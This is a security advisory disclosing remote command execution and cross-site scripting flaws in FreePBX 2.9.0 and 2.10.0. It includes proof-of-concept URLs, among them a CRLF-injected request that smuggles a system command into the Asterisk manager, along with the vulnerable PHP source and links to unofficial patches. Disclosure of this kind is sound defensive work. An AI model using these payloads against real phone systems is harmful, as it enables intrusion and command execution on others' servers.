@@ -1,0 +1,82 @@
+Product: FreePBX
+Version: 2.10.0, 2.9.0 and perhaps earlier versions
+Type: Remote Command Execution, XSS
+Release Date: March 14, 2012
+Vendor Notification Date: Jun 12, 2011
+Author: Martin Tschirsich
+
+
+Overview:
+
+
+A remote command execution vulnerability and some XSS in current and earlier
+FreePBX versions due to missing input sanitization.
+FreePBX is a popular implementation (500,000 active phone systems) of
+Asterisk (telephony software) based around a web-based configuration
+interface and other tools. Some of these installations are on a public IP
+address.
+
+
+Proof of Concept:
+
+RCE:
+[HOST]/recordings/misc/callme_page.php?action=c&callmenum=[PHONENUMBER]@from
+-internal/n%0D%0AApplication:%20system%0D%0AData:%20[CMD]%0D%0A%0D%0A
+
+XSS (2.9.0 and perhaps other versions):
+[HOST]/panel/index_amp.php?context=[XSS]
+[HOST]/panel/flash/mypage.php?clid=[XSS]
+[HOST]/panel/flash/mypage.php?clidname=[base64_encode(XSS)]
+[HOST]/panel/dhtml/index.php?context=/../%00">[XSS]
+[HOST]/admin/views/freepbx_reload.php/"</script>[XSS]
+[HOST]/recordings/index.php?login='>[XSS]
+
+
+Details (RCE):
+
+Missing input sanitization in htdocs/recordings/misc/callme_page.php:
+// line 28-30:
+$to         = $_REQUEST['callmenum']; // vulnerable
+$msgFrom    = $_REQUEST['msgFrom'];
+$new_path   = substr($path, 0, -4);     
+// line 38:
+$call_status = callme_startcall($to, $msgFrom, $new_path);
+
+Missing input sanitization in htdocs/recordings/includes/callme.php:
+// line 88-117:
+function callme_startcall($to, $from, $new_path)
+{
+        global $astman;
+        $channel        = "Local/$to () from-internal/n";  // vulnerable
+        $context        = "vm-callme";
+        $extension      = "s";
+        $priority       = "1";
+        $callerid       = "VMAIL/$from";
+        ...
+        /* Arguments to Originate: channel, extension, context, priority,
+timeout, callerid, variable, account, application, data */
+        $status = $astman->Originate($channel, $extension, $context,
+$priority, NULL, $callerid, $variable, NULL, NULL, NULL, NULL);
+        ...
+}
+
+
+Unofficial Patch (RCE, tested with 2.9.0):
+
+Patch htdocs/recordings/modules/callme_page.php:
+http://pastebin.com/ZbX50qaZ
+Patch htdocs/recordings/modules/voicemail.module:
+http://pastebin.com/vv3qczfC
+
+
+
+Disclaimer:
+
+
+The vendor has been contacted and provided with a patch several times since
+Jun 12, 2011. Since no intention to address this issue was shown, I felt it
+was in the best interest to disclose the vulnerability.
+
+All information in this advisory is provided on an 'as is' basis in the hope
+that it will be useful. The author not responsible for any risks or
+occurrences caused by the application of this information.
